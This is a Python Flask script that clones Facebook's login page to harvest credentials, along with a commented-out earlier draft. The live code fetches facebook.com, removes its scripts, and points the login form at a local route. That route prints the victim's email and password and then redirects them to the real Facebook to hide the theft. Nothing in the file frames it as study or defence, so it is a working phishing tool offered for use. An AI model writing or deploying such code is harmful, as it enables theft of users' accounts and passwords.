# import requests
# from flask import Flask ,request , render_template
#
#
#
# app=Flask(__name__)
#
# @app.route("/",methods=['GET','POST'])
# def fb_ka_page():
#     url = "https://www.facebook.com/"
#     a = requests.get(url)
#
#
#     return a.content
#
# @app.route('/account',methods=['POST'])
# def data():
#     if request.method=='POST':
#         entered_email=request.form['email']
#         entered_password=request.form['pass']
#         print(entered_email,entered_password)
#
#
# if __name__=="__main__":
#     app.run(host="0.0.0.0")








    # soup = BeautifulSoup(a.content, 'html.parser')
    # html_content= BeautifulSoup.prettify(soup)
    # return html_content



# @app.route("/exit")
# def exit_ki_koshish():
#     return "<h1> Chup Chaap login kar </h1>"
#
# @app.route("/data_input")
# def data_input():
#     data=request.args.get("x")
#     # when i write ?x=Paras in the url then the value "Paras" will be stored in data variable
#     # Similarly like a google search
#     return data
#
# if __name__=="__main__":
#     app.run(host="0.0.0.0")


import requests
from flask import Flask, request, redirect, url_for
from bs4 import BeautifulSoup

app = Flask(__name__)

# At first , the method will be 'GET' at root directory
@app.route("/", methods=['GET', 'POST'])
def fb_ka_page():
    url = "https://facebook.com/"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    # Remove script tags from the parsed HTML
    for script in soup(['script', 'noscript']):
        script.decompose()

    # Changing the action attribute
    form = soup.find('form', {'class': '_9vtf'})
    form['action'] = '/login'

    return str(soup)


@app.route('/login',methods=['POST'])
def data():
    if request.method == 'POST':
        entered_email = request.form['email']
        entered_password = request.form['pass']
        print("Entered Email:", entered_email)
        print("Entered Password:", entered_password)

        # Redirect the user to a different website after form submission
        return redirect(url_for('redirect_to_website'))



@app.route("/redirect", methods=['GET'])
def redirect_to_website():
    # Redirect to the desired website
    return redirect("https://facebook.com")


if __name__ == "__main__":
    app.run(debug=True)

# Facebook client side password encryption
# https://hackmd.io/@Ostrym/facebook-client-side-encryption